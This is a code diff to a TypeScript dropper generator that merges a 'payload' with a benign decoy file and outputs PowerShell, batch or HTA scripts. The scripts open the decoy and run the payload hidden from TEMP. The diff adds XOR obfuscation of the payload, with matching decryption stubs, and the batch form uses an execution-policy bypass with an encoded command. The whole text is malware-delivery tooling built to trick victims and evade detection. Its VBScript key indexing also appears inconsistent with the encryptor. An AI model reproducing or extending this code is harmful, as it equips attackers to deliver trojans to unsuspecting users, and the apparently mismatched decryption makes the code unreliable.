@@ -8,10 +8,16 @@ const FileInputSchema = z.object({
   content: z.string(), // Base64 Data URI
 });
 
+const EncryptionSchema = z.object({
+    type: z.literal('xor'),
+    key: z.string(),
+});
+
 const MergePayloadsInputSchema = z.object({
   payload: FileInputSchema,
   benign: FileInputSchema,
   outputFormat: z.enum(['ps1', 'bat', 'hta', 'js', 'vbs']),
+  encryption: EncryptionSchema.optional(),
 });
 
 type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;
@@ -31,7 +37,35 @@ function decodeDataUri(dataUri: string): string {
     return parts[1];
 }
 
-const generatePowershellDropper = (payloadName: string, payloadBase64: string, benignName: string, benignBase64: string): string => {
+// XOR Encryption function
+function xorEncrypt(data: string, key: string): string {
+    let result = '';
+    for (let i = 0; i < data.length; i++) {
+        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return result;
+}
+
+const generatePowershellDropper = (payloadName: string, payloadBase64: string, benignName: string, benignBase64: string, encryption?: z.infer<typeof EncryptionSchema>): string => {
+    
+    let payloadSection = `$payloadFileBytes = [System.Convert]::FromBase64String(@"
+${payloadBase64}
+"@)`;
+
+    if (encryption && encryption.type === 'xor') {
+        payloadSection = `
+$encryptedBase64 = @"
+${payloadBase64}
+"@
+$key = "${encryption.key}"
+$encryptedBytes = [System.Convert]::FromBase64String($encryptedBase64)
+$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
+$payloadFileBytes = New-Object byte[] $encryptedBytes.Length
+for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
+    $payloadFileBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
+}`;
+    }
+    
     return `
 $tempPath = $env:TEMP
 $benignFilePath = Join-Path $tempPath "${benignName}"
@@ -41,12 +75,11 @@ try {
     $benignFileBase64 = @"
 ${benignBase64}
 "@
-    $payloadFileBase64 = @"
-${payloadBase64}
-"@
-
+    
+    ${payloadSection}
+    
     [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
-    [IO.File]::WriteAllBytes($payloadFilePath, [System.Convert]::FromBase64String($payloadFileBase64))
+    [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
 
     Start-Process $benignFilePath
     Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
@@ -64,25 +97,65 @@ ${payloadBase64}
 export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
   try {
     const validatedInput = MergePayloadsInputSchema.parse(input);
-    const { payload, benign, outputFormat } = validatedInput;
+    const { payload, benign, outputFormat, encryption } = validatedInput;
 
-    const payloadBase64 = decodeDataUri(payload.content);
+    let payloadBase64 = decodeDataUri(payload.content);
     const benignBase64 = decodeDataUri(benign.content);
+
+    if (encryption && encryption.type === 'xor') {
+        // We encrypt the raw bytes, then Base64 encode the encrypted result
+        const rawPayload = Buffer.from(payloadBase64, 'base64');
+        const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryption.key), 'latin1');
+        payloadBase64 = encryptedPayload.toString('base64');
+    }
     
     let scriptContent = '';
 
     switch (outputFormat) {
         case 'ps1':
-            scriptContent = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64);
+            scriptContent = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption);
             break;
         
         case 'bat':
-            const psScript = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64);
+            const psScript = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption);
             const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
             scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
             break;
 
         case 'hta':
+             let vbsPayloadSection = `payloadB64 = "${payloadBase64}"
+                Call Base64ToFile(payloadB64, payloadFilePath)`;
+
+            if (encryption && encryption.type === 'xor') {
+                vbsPayloadSection = `
+                encryptedB64 = "${payloadBase64}"
+                key = "${encryption.key}"
+                
+                ' Decrypt the payload
+                Dim encryptedBytes, keyBytes, i
+                Set oXML = CreateObject("MSXML2.DOMDocument")
+                Set oNode = oXML.CreateElement("base64")
+                oNode.DataType = "bin.base64"
+                oNode.Text = encryptedB64
+                encryptedBytes = oNode.NodeTypedValue
+                
+                keyBytes = StrToBytes(key)
+                
+                For i = 0 To UBound(encryptedBytes)
+                    encryptedBytes(i) = encryptedBytes(i) Xor keyBytes(i Mod UBound(keyBytes))
+                Next
+                
+                ' Write decrypted bytes to file
+                With CreateObject("ADODB.Stream")
+                    .Type = 1 ' adTypeBinary
+                    .Open
+                    .Write encryptedBytes
+                    .SaveToFile payloadFilePath, 2 ' adSaveCreateOverWrite
+                    .Close
+                End With
+                `;
+            }
+
             const vbsPayload = `
                 Set objShell = CreateObject("WScript.Shell")
                 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -92,10 +165,9 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 payloadFilePath = tempPath & "\\${payload.name}"
 
                 benignB64 = "${benignBase64}"
-                payloadB64 = "${payloadBase64}"
-
                 Call Base64ToFile(benignB64, benignFilePath)
-                Call Base64ToFile(payloadB64, payloadFilePath)
+
+                ${vbsPayloadSection}
                 
                 objShell.Run "cmd /c """ & benignFilePath & """", 0, True
                 objShell.Run "cmd /c """ & payloadFilePath & """", 0, False ' Run payload hidden
@@ -117,6 +189,15 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                         .Close
                     End With
                 End Sub
+
+                Function StrToBytes(s)
+                    Dim bytes(), i
+                    ReDim bytes(Len(s) - 1)
+                    For i = 1 To Len(s)
+                        bytes(i-1) = Asc(Mid(s, i, 1))
+                    Next
+                    StrToBytes = bytes
+                End Function
             `;
             scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
             break;
